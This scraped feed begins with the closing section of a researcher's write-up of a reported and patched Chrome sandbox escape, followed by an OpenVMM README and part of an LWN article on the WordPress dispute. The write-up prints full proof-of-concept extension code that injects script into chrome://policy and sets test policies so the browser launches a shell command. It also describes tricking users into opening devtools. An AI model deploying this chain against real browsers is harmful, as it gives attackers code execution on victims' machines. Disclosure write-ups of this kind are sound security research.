<p><img alt="A screenshot of an alert() on chrome://policy." src="https://ading.dev/blog/assets/chrome_sandbox_escape/inspectedwindow_race.png"></p>
<p>And that's the final piece of the exploit chain working. This race condition relies on the fact that the inspected page and the devtools page are different processes. When the navigation to the WebUI occurs in the inspected page, there is a small window of time before the devtools page realizes and disables the API. If <code>inspectedWindow.reload()</code> is called within this interval of time, the reload request will end up on the WebUI page.</p>
<h2>Putting it All Together</h2>
<p>Now that I had all of the steps of the exploit working, I began putting together the proof of concept code. To recap, this POC has to do the following:</p>
<ol>
<li>Use the race condition in <code>chrome.devtools.inspectedWindow.reload()</code> to execute a JS payload on <code>chrome://policy</code></li>
<li>That payload calls <code>sendWithPromise("setLocalTestPolicies", policy)</code> to set custom user policies.</li>
<li>The <code>BrowserSwitcherEnabled</code>, <code>BrowserSwitcherUrlList</code>, <code>AlternativeBrowserPath</code>, and <code>AlternativeBrowserParameters</code> are set, specifying <code>/bin/bash</code> as the "alternate browser."</li>
<li>The browser switcher is triggered by a simple <code>window.open()</code> call, which executes a shell command.</li>
</ol>
<p>The final proof of concept exploit looked like this:</p>
<div><pre><span></span><code><span>let</span><span> executable</span><span>,</span><span> flags</span><span>;</span>
<span>if</span><span> </span><span>(</span><span>navigator</span><span>.</span><span>userAgent</span><span>.</span><span>includes</span><span>(</span><span>"Windows NT"</span><span>))</span><span> </span><span>{</span>
<span>  executable </span><span>=</span><span> </span><span>"C:\\Windows\\System32\\cmd.exe"</span><span>;</span>
<span>  flags </span><span>=</span><span> </span><span>[</span><span>"/C"</span><span>,</span><span> </span><span>"calc.exe &amp; rem ${url}"</span><span>];</span>
<span>}</span>
<span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>navigator</span><span>.</span><span>userAgent</span><span>.</span><span>includes</span><span>(</span><span>"Linux"</span><span>))</span><span> </span><span>{</span>
<span>  executable </span><span>=</span><span> </span><span>"/bin/bash"</span><span>;</span>
<span>  flags </span><span>=</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"xcalc # ${url}"</span><span>];</span>
<span>}</span>
<span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>navigator</span><span>.</span><span>userAgent</span><span>.</span><span>includes</span><span>(</span><span>"Mac OS"</span><span>))</span><span> </span><span>{</span>
<span>  executable </span><span>=</span><span> </span><span>"/bin/bash"</span><span>;</span>
<span>  flags </span><span>=</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"open -na Calculator # ${url}"</span><span>];</span>
<span>}</span>

<span>//function which injects the content script into the inspected page</span>
<span>function</span><span> inject_script</span><span>()</span><span> </span><span>{</span>
<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
<span>    (async () =&gt; {</span>
<span>      //check the origin, this script won't do anything on a non chrome page</span>
<span>      console.log(origin);</span>
<span>      if (!origin.startsWith("chrome://")) return;</span>

<span>      //import cr.js since we need sendWithPromise</span>
<span>      let cr = await import('chrome://resources/js/cr.js');</span>

<span>      //here are the policies we are going to set</span>
<span>      let policy = JSON.stringify([</span>
<span>        { //enable the browser switcher feature</span>
<span>          name: "BrowserSwitcherEnabled",</span>
<span>          value: true,</span>
<span>          level: 1,</span>
<span>          source: 1,</span>
<span>          scope: 1</span>
<span>        }, </span>
<span>        { //set the browser switcher to trigger on example.com</span>
<span>          name: "BrowserSwitcherUrlList",</span>
<span>          value: ["example.com"],</span>
<span>          level: 1,</span>
<span>          source: 1,</span>
<span>          scope: 1</span>
<span>        }, </span>
<span>        { //set the executable path to launch</span>
<span>          name: "AlternativeBrowserPath",</span>
<span>          value: </span><span>${</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>executable</span><span>)}</span><span>,</span>
<span>          level: 1,</span>
<span>          source: 1,</span>
<span>          scope: 1</span>
<span>        }, </span>
<span>        { //set the arguments for the executable</span>
<span>          name: "AlternativeBrowserParameters",</span>
<span>          value: </span><span>${</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>flags</span><span>)}</span><span>,</span>
<span>          level: 1,</span>
<span>          source: 1,</span>
<span>          scope: 1</span>
<span>        }</span>
<span>      ]);</span>

<span>      //set the policies listed above</span>
<span>      await cr.sendWithPromise("setLocalTestPolicies", policy, "");</span>

<span>      setTimeout(() =&gt; {</span>
<span>        //navigate to example.com, which will trigger the browser switcher</span>
<span>        location.href = "https://example.com";</span>

<span>        //open a new page so that there is still a tab remaining after this</span>
<span>        open("about:blank");  </span>
<span>      }, 100);</span>
<span>    })()`</span>
<span>  </span><span>});</span>
<span>}</span>

<span>//interval to keep trying to inject the content script</span>
<span>//there's a tiny window of time in which the content script will be</span>
<span>//injected into a protected page, so this needs to run frequently</span>
<span>function</span><span> start_interval</span><span>()</span><span> </span><span>{</span>
<span>  setInterval</span><span>(()</span><span> </span><span>=&gt;</span><span> </span><span>{</span>
<span>    </span><span>//loop to increase our odds</span>
<span>    </span><span>for</span><span> </span><span>(</span><span>let</span><span> i</span><span>=</span><span>0</span><span>;</span><span> i</span><span>&lt;</span><span>3</span><span>;</span><span> i</span><span>++)</span><span> </span><span>{</span>
<span>      inject_script</span><span>();</span><span> </span>
<span>    </span><span>}</span>
<span>  </span><span>},</span><span> </span><span>0</span><span>);</span><span>  </span>
<span>}</span>

<span>async</span><span> </span><span>function</span><span> main</span><span>()</span><span> </span><span>{</span>
<span>  </span><span>//start the interval to inject the content script</span>
<span>  start_interval</span><span>();</span>

<span>  </span><span>//navigate the inspected page to chrome://policy</span>
<span>  </span><span>let</span><span> tab </span><span>=</span><span> </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>get</span><span>(</span><span>chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>tabId</span><span>);</span>
<span>  </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"chrome://policy"</span><span>});</span>

<span>  </span><span>//if this times out we need to retry or abort</span>
<span>  </span><span>await</span><span> </span><span>new</span><span> </span><span>Promise</span><span>((</span><span>resolve</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span>setTimeout</span><span>(</span><span>resolve</span><span>,</span><span> </span><span>1000</span><span>)});</span>
<span>  </span><span>let</span><span> new_tab </span><span>=</span><span> </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>get</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>);</span>

<span>  </span><span>//if we're on the policy page, the content script didn't get injected</span>
<span>  </span><span>if</span><span> </span><span>(</span><span>new_tab</span><span>.</span><span>url</span><span>.</span><span>startsWith</span><span>(</span><span>"chrome://policy"</span><span>))</span><span> </span><span>{</span>
<span>    </span><span>//navigate back to the original page</span>
<span>    </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> tab</span><span>.</span><span>url</span><span>});</span>

<span>    </span><span>//discarding and reloading the tab will close devtools</span>
<span>    setTimeout</span><span>(()</span><span> </span><span>=&gt;</span><span> </span><span>{</span>
<span>      chrome</span><span>.</span><span>tabs</span><span>.</span><span>discard</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>);</span>
<span>    </span><span>},</span><span> </span><span>100</span><span>)</span>
<span>  </span><span>}</span>

<span>  </span><span>//we're still on the original page, so reload the extension frame to retry</span>
<span>  </span><span>else</span><span> </span><span>{</span>
<span>    location</span><span>.</span><span>reload</span><span>();</span>
<span>  </span><span>}</span>
<span>}</span>

<span>main</span><span>();</span>
</code></pre></div>

<p>And with that, I was ready to write the bug report. I finalized the script, wrote an explanation of the bug, tested it on multiple operating systems, and sent it in to Google. </p>
<p>At this point however, there was still a glaring problem: The race condition with <code>.inspectedWindow.reload()</code> was not very reliable. I managed to tweak it so that it worked about 70% of the time, but that still wasn't enough. While the fact that it worked at all definitely made it a serious vulnerability regardless, the unreliability would have reduced the severity by quite a bit. So then I got to work trying to find a better way.</p>
<h2>A Familiar Approach</h2>
<p>Remember how I mentioned that in David Erceg's bug report, he utilized the fact that debugger requests persist after the tab crashes? I wondered if this exact method worked for <code>inspectedWindow.reload()</code> too, so I tested it. I also messed with the <code>debugger</code> statement, and it appeared that triggering the debugger twice in a row caused the tab to crash.</p>
<p>So I got to work writing a new POC:</p>
<div><pre><span></span><code><span>let</span><span> tab_id </span><span>=</span><span> chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>tabId</span><span>;</span>

<span>//function which injects the content script into the inspected page</span>
<span>function</span><span> inject_script</span><span>()</span><span> </span><span>{</span>
<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
<span>    //check the origin, so that the debugger is triggered instead if we are not on a chrome page</span>
<span>    if (!origin.startsWith("chrome://")) {</span>
<span>      debugger;</span>
<span>      return;</span>
<span>    }</span>

<span>    alert("hello from chrome.devtools.inspectedWindow.reload");`</span>
<span>  </span><span>});</span>
<span>}</span>

<span>function</span><span> sleep</span><span>(</span><span>ms</span><span>)</span><span> </span><span>{</span>
<span>  </span><span>return</span><span> </span><span>new</span><span> </span><span>Promise</span><span>((</span><span>resolve</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span>setTimeout</span><span>(</span><span>resolve</span><span>,</span><span> ms</span><span>)})</span>
<span>}</span>

<span>async</span><span> </span><span>function</span><span> main</span><span>()</span><span> </span><span>{</span>
<span>  </span><span>//we have to reset the tab's origin here so that we don't crash our own extension process</span>
<span>  </span><span>//this navigates to example.org which changes the tab's origin</span>
<span>  </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab_id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"https://example.org/"</span><span>});</span>
<span>  </span><span>await</span><span> sleep</span><span>(</span><span>500</span><span>);</span>
<span>  </span><span>//navigate to about:blank from within the example.org page which keeps the same origin</span>
<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
<span>      location.href = "about:blank";</span>
<span>    `</span><span> </span>
<span>  </span><span>})</span>
<span>  </span><span>await</span><span> sleep</span><span>(</span><span>500</span><span>);</span>

<span>  inject_script</span><span>();</span><span> </span><span>//pause the current tab</span>
<span>  inject_script</span><span>();</span><span> </span><span>//calling this again crashes the tab and queues up our javascript</span>
<span>  </span><span>await</span><span> sleep</span><span>(</span><span>500</span><span>);</span>
<span>  chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab_id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"chrome://settings"</span><span>});</span>
<span>}</span>

<span>main</span><span>();</span>
</code></pre></div>

<video controls="">
  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/devtools_api_vuln.mp4" type="video/mp4">
  <p>Video info: A demonstration of the method that involves crashing the inspected page.</p>
</video>

<p>And it works! This nice part about this approach is that it eliminates the need for a race condition and makes the exploit 100% reliable. Then, I uploaded the new POC, with all of the <code>chrome://policy</code> stuff, to a comment on the bug report thread. </p>
<p>But why would this exact oversight still exist even though it should have been patched 4 years ago? We can figure out why by looking at how that previous bug was patched. Google's fix was to <a href="https://chromium-review.googlesource.com/c/chromium/src/+/2587606">clear all the pending debugger requests</a> after the tab crashes, which seems like a sensible approach:</p>
<div><pre><span></span><code><span>void</span><span> </span><span>DevToolsSession::ClearPendingMessages</span><span>(</span><span>bool</span><span> did_crash</span><span>)</span><span> </span><span>{</span>
<span>  </span><span>for</span><span> </span><span>(</span><span>auto</span><span> it </span><span>=</span><span> pending_messages_</span><span>.</span><span>begin</span><span>();</span><span> it </span><span>!=</span><span> pending_messages_</span><span>.</span><span>end</span><span>();)</span><span> </span><span>{</span>
<span>    </span><span>const</span><span> PendingMessage</span><span>&amp;</span><span> message </span><span>=</span><span> </span><span>*</span><span>it</span><span>;</span>
<span>    </span><span>if</span><span> </span><span>(</span><span>SpanEquals</span><span>(</span><span>crdtp</span><span>::</span><span>SpanFrom</span><span>(</span><span>"Page.reload"</span><span>),</span>
<span>                   crdtp</span><span>::</span><span>SpanFrom</span><span>(</span><span>message</span><span>.</span><span>method</span><span>)))</span><span> </span><span>{</span>
<span>      </span><span>++</span><span>it</span><span>;</span>
<span>      </span><span>continue</span><span>;</span>
<span>    </span><span>}</span>
<span>    </span><span>// Send error to the client and remove the message from pending.</span>
<span>    std</span><span>::</span><span>string error_message </span><span>=</span>
<span>        did_crash </span><span>?</span><span> kTargetCrashedMessage </span><span>:</span><span> kTargetClosedMessage</span><span>;</span>
<span>    SendProtocolResponse</span><span>(</span>
<span>        message</span><span>.</span><span>call_id</span><span>,</span>
<span>        crdtp</span><span>::</span><span>CreateErrorResponse</span><span>(</span>
<span>            message</span><span>.</span><span>call_id</span><span>,</span>
<span>            crdtp</span><span>::</span><span>DispatchResponse</span><span>::</span><span>ServerError</span><span>(</span><span>error_message</span><span>)));</span>
<span>    waiting_for_response_</span><span>.</span><span>erase</span><span>(</span><span>message</span><span>.</span><span>call_id</span><span>);</span>
<span>    it </span><span>=</span><span> pending_messages_</span><span>.</span><span>erase</span><span>(</span><span>it</span><span>);</span>
<span>  </span><span>}</span>
<span>}</span>
</code></pre></div>

<p>You may notice that it seems to contain an exception for the <code>Page.reload</code> requests so that they are not cleared. Internally, the <code>inspectedWindow.reload()</code> API sends a <code>Page.reload</code> request, so as a result the <code>inspectedWindow.reload()</code> API calls are exempted from this patch. Google really patched this bug, then added an exception to it which made the bug possible again. I guess they didn't realize that <code>Page.reload</code> could also run scripts.</p>
<p>Another mystery is why the page crashes when the <code>debugger</code> statement is run twice. I'm still not completely sure about this one, but I think I narrowed it down to a function within Chromium's renderer code. It's specifically happens when Chromium <a href="https://source.chromium.org/chromium/chromium/src/+/main:content/renderer/render_frame_impl.cc;l=1345-1346;drc=770f3fce3719ee18c102ad0b1a347d82147fbb1a">checks the navigation state</a>, and when it encounters an unexpected state, it crashes. This state gets messed up when <a href="https://source.chromium.org/chromium/chromium/src/+/main:content/renderer/render_frame_impl.cc;l=5622;drc=770f3fce3719ee18c102ad0b1a347d82147fbb1a?q=navigation_commit_state_&amp;ss=chromium%2Fchromium%2Fsrc">RenderFrameImpl::SynchronouslyCommitAboutBlankForBug778318</a> is called (yet another side effect of treating <code>about:blank</code> specially). Of course, any kind of crash works, such as with <code>[...new Array(2**31)]</code>, which causes the tab to run out of memory. However, the <code>debugger</code> crash is much faster to trigger so that's what I used in my final POC.</p>
<p>Anyways, here's what the exploit looks like in action:</p>
<video controls="">
  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/sandbox_escape_final.mp4" type="video/mp4">
  <p>Video info: A demonstration of the final POC.</p>
</video>

<p>By the way, you might have noticed the "extension install error" screen that is shown. That's just to trick the user into opening devtools, which triggers the chain leading to the sandbox escape.</p>
<h2>Google's Response</h2>
<p>After I reported the vulnerability, Google quickly confirmed it and classified it as P1/S1, which means high priority and high severity. Over the next few weeks, the following fixes were implemented:</p>
<ul>
<li><a href="https://chromium-review.googlesource.com/c/chromium/src/+/5542082">Adding a <code>loaderId</code> argument to the <code>Page.reload</code> command</a> and <a href="https://chromium-review.googlesource.com/c/chromium/src/+/5625857">checking the <code>loaderID</code> on the renderer side</a>  - This ensures that the command is only valid for a single origin and won't work if the command reaches a privileged page unintentionally.</li>
<li><a href="https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/5546062">Checking for the URL in the <code>inspectedWindow.reload()</code> function</a> - Now, this function isn't dependent on only the extension API revoking access.</li>
<li><a href="https://chromium-review.googlesource.com/c/chromium/src/+/5679162">Checking if the test policies are enabled in the WebUI handler</a> - By adding a working check in the handler function, this prevents the test policies from being set entirely.</li>
</ul>
<p>Eventually, the vulnerability involving the race condition was assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5836">CVE-2024-5836</a>, with a CVSS severity score of 8.8 (High). The vulnerability involving crashing the inspected page was assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6778">CVE-2024-6778</a>, also with a severity score of 8.8.</p>
<p>Once everything was fixed and merged into the various release branches, the VRP panel reviewed the bug report and determined the reward. <strong>I received with $20,000 for finding this vulnerability!</strong></p>
<p><img alt="A screenshot of the message which announced the reward amount" src="https://ading.dev/blog/assets/chrome_sandbox_escape/reward_annoucement.png"></p>
<p><img alt="A screenshot of the message which gave the rationale for the reward" src="https://ading.dev/blog/assets/chrome_sandbox_escape/reward_rationale.png"></p>
<h2>Timeline</h2>
<ul>
<li>April 16 - I discovered the test policies bug</li>
<li>April 29 - I found the <code>inspectedWindow.reload()</code> bug involving the race condition</li>
<li>May 1 - I sent the bug report to Google</li>
<li>May 4 - Google classified it as P1/S1 </li>
<li>May 5 - I found the bug involving crashing the inspected page, and updated my report </li>
<li>May 6 - Google asked me to file separate bug reports for every part of the chain</li>
<li>July 8 - The bug report is marked as fixed</li>
<li>July 13 - The report is sent to the Chrome VRP panel to determine a reward</li>
<li>July 17 - The VRP panel decided the reward amount to be $20,000</li>
<li>October 15 - The entire bug report became public</li>
</ul>
<h2>Conclusion</h2>
<p>I guess the main takeaway from all of this is that if you look in the right places, the simplest mistakes can be compound upon each other to result in a vulnerability with surprisingly high severity. You also can't trust that very old code will remain safe after many years, considering that the <code>inspectedWindow.reload</code> bug actually works as far back as Chrome v45. Additionally, it isn't a good idea to ship completely undocumented, incomplete, and insecure features to everyone, as was the case with the policy test page bug. Finally, when fixing a vulnerability, you should check to see if similar bugs are possible and try to fix those as well.</p>
<p>You may find the original bug report here: <a href="https://issues.chromium.org/issues/40053357">crbug.com/40053357</a></p>
<p>I've also put the POCs for each part of the vulnerability in <a href="https://github.com/ading2210/CVE-2024-6778-POC">a Github repo</a>.</p>


        
          <p><a href="https://ading.dev/blog/">&lt;- Back</a></p>
        
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenVMM – A New VMM for Windows and Linux, Written in Rust (142 pts)]]></title>
            <link>https://github.com/microsoft/openvmm</link>
            <guid>41866742</guid>
            <pubDate>Thu, 17 Oct 2024 05:42:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/microsoft/openvmm">https://github.com/microsoft/openvmm</a>, See on <a href="https://news.ycombinator.com/item?id=41866742">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">OpenVMM</h2><a id="user-content-openvmm" aria-label="Permalink: OpenVMM" href="#openvmm"></a></p>
<p dir="auto"><a href="https://github.com/microsoft/openvmm/actions/workflows/openvmm-ci.yaml"><img src="https://github.com/microsoft/openvmm/actions/workflows/openvmm-ci.yaml/badge.svg?branch=main" alt="Build Status"></a></p>
<p dir="auto">OpenVMM is a new VMM for Windows and Linux, written in Rust.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Developer Guide</h2><a id="user-content-developer-guide" aria-label="Permalink: Developer Guide" href="#developer-guide"></a></p>
<p dir="auto">See the <a href="https://aka.ms/openvmmguide" rel="nofollow">developer guide</a> and in particular the getting started section.</p>
<p dir="auto">The guide is published out of this repo via <a href="https://github.com/microsoft/openvmm/blob/main/Guide/src/SUMMARY.md">Markdown files</a>.
Please keep them up-to-date.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">This project welcomes contributions and suggestions.  Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit <a href="https://cla.opensource.microsoft.com/" rel="nofollow">https://cla.opensource.microsoft.com</a>.</p>
<p dir="auto">When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.</p>
<p dir="auto">This project has adopted the <a href="https://opensource.microsoft.com/codeofconduct/" rel="nofollow">Microsoft Open Source Code of Conduct</a>.
For more information see the <a href="https://opensource.microsoft.com/codeofconduct/faq/" rel="nofollow">Code of Conduct FAQ</a> or
contact <a href="mailto:opencode@microsoft.com">opencode@microsoft.com</a> with any additional questions or comments.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Trademarks</h2><a id="user-content-trademarks" aria-label="Permalink: Trademarks" href="#trademarks"></a></p>
<p dir="auto">This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft
trademarks or logos is subject to and must follow
<a href="https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general" rel="nofollow">Microsoft's Trademark &amp; Brand Guidelines</a>.
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[WordPress retaliation impacts community (222 pts)]]></title>
            <link>https://lwn.net/SubscriberLink/993895/c0438e0ee9382c5f/</link>
            <guid>41866328</guid>
            <pubDate>Thu, 17 Oct 2024 04:06:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://lwn.net/SubscriberLink/993895/c0438e0ee9382c5f/">https://lwn.net/SubscriberLink/993895/c0438e0ee9382c5f/</a>, See on <a href="https://news.ycombinator.com/item?id=41866328">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<blockquote>
<div>
<h3>Welcome to LWN.net</h3>
<p>
The following subscription-only content has been made available to you 
by an LWN subscriber.  Thousands of subscribers depend on LWN for the 
best news from the Linux and free software communities.  If you enjoy this 
article, please consider <a href="https://lwn.net/subscribe/">subscribing to LWN</a>.  Thank you
for visiting LWN.net!
</p></div>
</blockquote>

<p>It is too early to say what the outcome will be in the <a href="https://lwn.net/Articles/991906/">ongoing fight</a> between <a href="https://automattic.com/">Automattic</a> and <a href="https://wpengine.com/">WP&nbsp;Engine</a>, but the <a href="https://wordpress.org/">WordPress</a> community at large is already the
loser. Automattic founder and CEO Matt Mullenweg has been using
his control of the project, and the WordPress.org infrastructure, to
punish WP&nbsp;Engine and remove some dissenting contributors from discussion
channels. Most recently, Mullenweg has instituted a hostile fork of a
WP&nbsp;Engine plugin and the forked plugin is replacing the original
via WordPress updates.</p>

<p>In the beginning of the Automattic and WP&nbsp;Engine spat, many
people hoped that the companies would ratchet down the
hostilities—or at least leave it to lawyers to sort out while
leaving the larger community out of it. Those hopes have gone unrealized.</p>

<p>WP&nbsp;Engine did try to opt for the legal-only route. The day
after the "<a href="https://wordpress.org/news/2024/09/wp-engine-reprieve/">reprieve</a>"
on the <a href="https://wordpress.org/news/2024/09/wp-engine-banned/">WordPress.org
ban</a> ended, October&nbsp;2, WP&nbsp;Engine filed a <a href="https://wpengine.com/wp-content/uploads/2024/10/Complaint-WP-Engine-v-Automattic-et-al.pdf">62‑page
complaint</a> against Automattic and Mullenweg personally, and asked
for a jury trial. The suit's claims include contractual
interference, computer fraud (for blocking its access to WordPress.org),
attempted extortion, libel, and slander. In addition, the suit asks for
declaratory judgment that WP&nbsp;Engine is not infringing on or
diluting the WordPress, WooCommerce, and other trademarks that
Automattic named in its <a href="https://automattic.com/2024/wp-engine-cease-and-desist.pdf">cease‑and‑desist letter</a>.</p>

<p>That is, of course, a move that was unlikely to rebuild any burned
bridges between Automattic and WP&nbsp;Engine. It was predictable that
the WordPress.org ban would remain in place, that
Automattic would respond to the suit, and perhaps countersue
WP&nbsp;Engine. However, to date, there has been no indication of a
countersuit or response to WP&nbsp;Engine's lawsuit. Instead,
Mullenweg is using other means to cause problems for
WP&nbsp;Engine—and those tactics have spilled over to the wider
WordPress community in troubling ways.</p>

<h4>The checkbox</h4>

<p>Participating in the development of WordPress is not realistically
possible without logging into the site. Using WordPress.org is
mandatory for those who would like to <a href="https://wordpress.org/plugins/developers/">contribute and update
plugins</a>, <a href="https://core.trac.wordpress.org/">access the
WordPress Trac (bug tracker) instance</a>, and more. On October&nbsp;9, <a href="https://wptavern.com/wordpress-org-login-gets-mandatory-affiliation-checkbox-following-wp-engine-dispute">a
new checkbox was added</a> to the account login form on WordPress.org
which reads "<q>I am not affiliated with WP&nbsp;Engine in any way,
financially or otherwise.</q>" If the box is left unchecked, users
will get a prompt to check the box if they wish to proceed.</p>

<p>Naturally, many contributors had questions about this new
checkbox, since its wording is ambiguous and any possible consequences
are murky. It seems clear it would apply to those employed by
WP&nbsp;Engine, but just how far does "<q>financially and
otherwise</q>" go? Does this apply, for example, to employees of the
many companies that host their clients' web sites on WP&nbsp;Engine?
Customers with a subscription to one of WP&nbsp;Engine's services? A
number of contributors have sought answers about this
policy in the WordPress Slack, with disappointing results. A handful
have reported being banned from the Slack instance after these conversations, either due to
pressing for answers or questioning Mullenweg's leadership.</p>

<p>Javier Casares <a href="https://twitter.com/JavierCasares/status/1843963052183433331">shared</a> that his account was deactivated after he asked a series
of questions in <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728463928352389">a Slack
thread</a> started by Colin Stewart. (Note that one needs to have a
WordPress.org account, and be signed in, to request an account on the
WordPress Slack.) In the thread, Mullenweg said that the value of the
checkbox is not stored, but refused to clarify what qualifies as an
affiliation with WP&nbsp;Engine. He advised those who had questions to
"<q>consult a lawyer</q>".</p>

<!-- middle-ad -->

<p>Casares said that most people agree that WP&nbsp;Engine should
contribute more to WordPress, but that using WordPress.org as part of
the battle is counterproductive. He asked on Slack that the language be
changed to indicate a user does not <em>work</em> for WP&nbsp;Engine,
but that suggestion was not taken up.</p>

<h4>Pick a side</h4>

<p>Another participant, Terence Eden, <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728557220371169?thread_ts=1728463928.352389&amp;cid=C02QB8GMM">asked
on Slack</a>
whether he could send pull requests via GitHub if he was affiliated
with WP&nbsp;Engine. After an exchange with Mullenweg that was less
than helpful, Eden replied:</p>

<blockquote>
I've never seen anyone spread so much FUD about their own project
before. I started out as sympathetic to your cause against WP
Engine. But your behaviour has driven me - and many other good people
- away.
</blockquote>

<p>He later <a href="https://mastodon.social/@Edent/113287622359524228">reported on
Mastodon</a> that his account was deactivated.
Andrew Hutchings, a contributor who works on WordPress as part of
his work with the <a href="https://mariadb.org/">MariaDB
Foundation</a>, participated in the conversation
as well. He <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728468126620539?thread_ts=1728463928.352389&amp;cid=C02QB8GMM">wondered
on Slack</a>
how many individual contributors could afford a lawyer to advise about
the checkbox and added "<q>I work for a different Foundation, one that
definitely cannot afford a lawyer for me to contribute.</q>" He <a href="https://linuxjedi.co.uk/my-wordpress-slack-ban/">wrote</a> on
his blog about being banned and said that he just wanted to work on
the project:</p>

<blockquote>
I think I speak for many in the WordPress community / ecosystem when I
say that we don't want to take sides in this battle. We don't want to
be forced to take sides via a checkbox. We just want to get work done,
to improve WordPress for everyone.
</blockquote>

<p>That may not be an option. During the
checkbox discussion in the #meta Slack channel Alex Sirota <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728466624103039?thread_ts=1728463928.352389&amp;cid=C02QB8GMM">said</a>:
"<q>Do you not understand what is happening here? It's pretty simple
in my opinion: you have to take a side.</q>" Stewart <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728466840305579?thread_ts=1728463928.352389&amp;cid=C02QB8GMM">said</a> that if that
was the intention, then Mullenweg could say so himself. Shortly after,
Mullenweg <a href="https://wordpress.slack.com/archives/C02QB8GMM/p1728466945131879?thread_ts=1728463928.352389&amp;cid=C02QB8GMM">said</a>,
"<q>I want you all to be informed and involved. Not to stay on the
sidelines.</q>" Sirota's account has also been deactivated now, though it is not clear
whether he was banned or deactivated the account himself.</p>

<p>Mullenweg had also asked Automattic employees to pick a side, shortly
after banning WP&nbsp;Engine from WordPress.org. He <a href="https://ma.tt/2024/10/alignment/">wrote</a> on October&nbsp;3
that Automattic had extended an "<q>Alignment Offer</q>" to its
employees. The company provided a buyout package of $30,000 or six
months of salary (whichever was higher) to employees who wanted to
leave because they disagreed with Mullenweg's actions. Employees who
accepted the buyout were immediately terminated and are not eligible
for rehire. According to the post, 159&nbsp;people⁠—⁠8.4% of the
company⁠—⁠accepted the offer.</p>

<h4>Advanced Custom Fields</h4>

<p>WordPress's popularity has a lot to do with its plugins and themes.
A vanilla WordPress installation is missing a lot of
features that one might want or need to run a web site: backups,
commerce features, statistics, contact forms, search-engine
optimization (SEO), managing URL redirects, or adding additional
content types to WordPress.</p> 

<p>A large ecosystem has sprung up around WordPress to offer services
via those plugins, paid versions of plugins with additional
functionality, and paid themes to simplify site design. In turn, that
helps solidify WordPress's place as the most popular content-management
system (CMS) on the web.</p> 

<p>WP&nbsp;Engine produces popular plugin called <a href="https://www.advancedcustomfields.com/">Advanced Custom
Fields</a> (ACF), which has more than two million installs through
WordPress.org. It allows developers to add <a href="https://www.advancedcustomfields.com/resources/getting-started-with-acf/#creating-fields">extra content
fields</a> (called custom fields) to WordPress's edit screens. This
might be used, for example, as part of adding a <a href="https://www.advancedcustomfields.com/resources/date-picker/">date
picker</a> or an <a href="https://www.advancedcustomfields.com/resources/gallery/">interface
to create photo galleries</a> for a site. ACF is, in turn, used by or
in conjunction with <a href="https://wordpress.org/plugins/search/Advanced+Custom+Fields/">a
